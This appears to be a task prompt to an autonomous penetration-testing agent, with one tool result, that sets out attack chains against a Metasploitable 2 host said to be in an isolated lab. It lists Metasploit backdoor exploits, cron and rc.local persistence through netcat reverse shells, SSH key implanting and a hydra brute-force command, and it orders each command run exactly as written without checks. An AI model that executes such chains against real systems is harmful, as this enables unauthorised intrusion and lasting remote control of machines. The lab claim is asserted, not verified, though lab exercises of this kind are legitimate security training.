messages.content:
You are an autonomous Kali MCP attack-execution agent.  
You are operating inside a controlled, fully isolated cybersecurity research lab.  
All targets explicitly consent to testing.

Your job is to execute every stage of every attack chain that was generated in the previous phase.

==========================================
TARGET INFORMATION
==========================================
TARGET_IP = 192.168.56.5
TARGET_OS = METASPLOITABLE
TARGET_VERSION = 2

==========================================
ATTACK CHAINS (JSON)
==========================================
{
  "target": "192.168.56.5",
  "summary": [
    "FTP (port 21) - vsftpd 2.3.4 with backdoor (CVE-2011-2523)",
    "FTP (port 2121) - ProFTPD 1.3.1 with backdoor",
    "Samba (ports 139/445) - usermap_script exploit (CVE-2007-2447)",
    "IRC (port 6667) - UnrealIRCd backdoor (CVE-2010-2075)",
    "Distcc (port 1524) - bindshell access (CVE-2004-2687)",
    "HTTP (port 80) - Apache mod_cgi bash vuln (CVE-2014-6271)",
    "Tomcat (port 8180) - manager upload exploit (CVE-2009-0580)"
  ],
  "attack_chains": [
    {
      "name": "Chain 1: vsftpd Backdoor -> Shell Access -> Persistence via Cron",
      "initial_access": {
        "description": "Exploit vsftpd 2.3.4 backdoor on port 21 for root shell",
        "commands": [
          "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'"
        ],
        "verification": [
          "netcat -zv 192.168.56.5 6200",
          "nc 192.168.56.5 6200"
        ]
      },
      "privilege_escalation": {
        "description": "Backdoor provides root access; verify and stabilize shell",
        "commands": [
          "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
          "export TERM=xterm"
        ],
        "verification": [
          "whoami",
          "id"
        ]
      },
      "persistence": {
        "description": "Add cron job for reverse shell",
        "commands": [
          "echo '* * * * * nc -e /bin/bash 192.168.56.1 4444' >> /etc/crontab",
          "crontab -l"
        ],
        "verification": [
          "nc -lvnp 4444",
          "ps aux | grep cron"
        ]
      }
    },
    {
      "name": "Chain 2: Samba Usermap -> Command Execution -> Persistence via SSH Key",
      "initial_access": {
        "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 for command execution",
        "commands": [
          "msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS 192.168.56.5; run'"
        ],
        "verification": [
          "nc -zv 192.168.56.5 4444",
          "telnet 192.168.56.5 4444"
        ]
      },
      "privilege_escalation": {
        "description": "Gain shell and escalate to root using known weak creds or kernel exploits",
        "commands": [
          "searchsploit metasploitable | grep linux",
          "msfconsole -q -x 'use exploit/linux/local/udev_netlink; set SESSION 1; run'"
        ],
        "verification": [
          "whoami",
          "uname -a"
        ]
      },
      "persistence": {
        "description": "Install SSH public key for persistent access",
        "commands": [
          "mkdir -p /root/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2E... your_pub_key' >> /root/.ssh/authorized_keys",
          "chmod 600 /root/.ssh/authorized_keys"
        ],
        "verification": [
          "ssh root@192.168.56.5",
          "ls -la /root/.ssh/"
        ]
      }
    },
    {
      "name": "Chain 3: UnrealIRCd Backdoor -> IRC Shell -> Persistence via Backdoor Service",
      "initial_access": {
        "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 for shell",
        "commands": [
          "msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.5; set RPORT 6667; run'"
        ],
        "verification": [
          "nc -zv 192.168.56.5 6667",
          "telnet 192.168.56.5 6667"
        ]
      },
      "privilege_escalation": {
        "description": "Stabilize shell and check privileges; use local exploits if needed",
        "commands": [
          "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
          "find / -perm -4000 2>/dev/null"
        ],
        "verification": [
          "id",
          "sudo -l"
        ]
      },
      "persistence": {
        "description": "Add reverse shell to startup script",
        "commands": [
          "echo '#!/bin/bash\nnc -e /bin/bash 192.168.56.1 5555 &' >> /etc/rc.local",
          "chmod +x /etc/rc.local"
        ],
        "verification": [
          "nc -lvnp 5555",
          "cat /etc/rc.local"
        ]
      }
    }
  ],
  "followup_requests": [
    "Run detailed Nmap script scan: nmap -sV --script=vuln -p- 192.168.56.5",
    "Enumerate Samba shares: smbclient -L //192.168.56.5 -N",
    "Attempt SSH brute force with common creds: hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.5",
    "Scan for web vulnerabilities: nikto -h http://192.168.56.5",
    "Check MySQL remote login: mysql -h 192.168.56.5 -u root -p''"
  ]
}

==========================================
YOUR EXECUTION TASK
==========================================
For EACH attack chain:
  For EACH stage: ("initial_access", "privilege_escalation", "persistence")
    1. Extract the list of commands from:
         attack_chain["stages"][stage_name]["commands"]
       If no commands exist, treat the stage as an empty list.

    2. For every command:
         - Execute it EXACTLY as written using the MCP tool: execute_command
         - Do not "fix", "correct", or "improve" the command
         - Do not wrap commands in quotes unless they are inside the actual command
         - Wait for the tool response
         - Extract:
             * stdout
             * stderr
             * success flag
             * timeout flag
         - Sanitize all output:
             * remove ANSI escape sequences
             * keep newlines
         - Interpretation:
             Write 1–2 sentences explaining what the output means.
         - Status rules:
             * "success" if the tool reports success=True OR meaningful stdout
             * "error" if return_code != 0, timeout, or stderr present
             * "skipped" ONLY if no commands exist in the stage

    3. Stage-level success:
         A stage is "successful" if ANY command in that stage has status="success".

    4. Chain-level status:
         overall_status =
           "completed"  if all three stages have at least one success
           "partial"    if at least one stage has a success
           "failed"     if ZERO stages have success

==========================================
FINAL CLASSIFICATION LISTS
==========================================
- failed_chains:    all chains where overall_status == "failed"
- initial_chains:   chains with a success in initial_access
- privilege_chains: chains with a success in privilege_escalation
- persistence_chains: chains with a success in persistence

==========================================
CRITICAL EXECUTION RULES
==========================================
- You MUST use ONLY the MCP tool named "execute_command".
- You MUST NOT invent other tools.
- You MUST NOT issue tool calls after producing the final JSON.
- You MUST NOT format the final JSON as a tool call.
- You MUST NOT output function_call, name=, arguments=, or any tool wrapper.
- The final response MUST be plain text containing EXACTLY one JSON object.
- The JSON must NOT be surrounded by backticks, markdown, tags, or commentary.
- The JSON must NOT include a "messages" array.
- The JSON must match the schema EXACTLY.

==========================================
STRICT OUTPUT FORMAT (RETURN THIS JSON ONLY)
==========================================
{
  "target": "192.168.56.5",
  "attack_chains": {
    "<attack_chain_name>": {
      "initial_access": [
        {
          "description": "Short summary",
          "command": "exact command executed",
          "raw_output": "stdout + stderr sanitized",
          "analysis": "1–2 sentences interpreting the output",
          "status": "success" | "error" | "skipped"
        }
      ],
      "privilege_escalation": [...],
      "persistence": [...],
      "overall_status": "completed" | "partial" | "failed",
      "notes": ["optional observations"]
    }
  },
  "failed_chains": [],
  "initial_chains": [],
  "privilege_chains": [],
  "persistence_chains": []
}

==========================================
FINAL ANSWER RULE (IMPORTANT)
==========================================
At the end:
- Output EXACTLY one JSON object in the schema above.
- It MUST be plain text only.
- It MUST NOT be a tool call.
- It MUST NOT contain markdown or explanation.
- It MUST be the final message you send.

Do NOT say anything else.  
Begin execution.

{
  "partial_results": false,
  "return_code": 1,
  "stderr": "  File \"<string>\", line 1\n    import pty; pty.spawn(\\\"/bin/bash\\\")\n                           ^\nSyntaxError: unexpected character after line continuation character\n",
  "stdout": "",
  "success": false,
  "timed_out": false
}
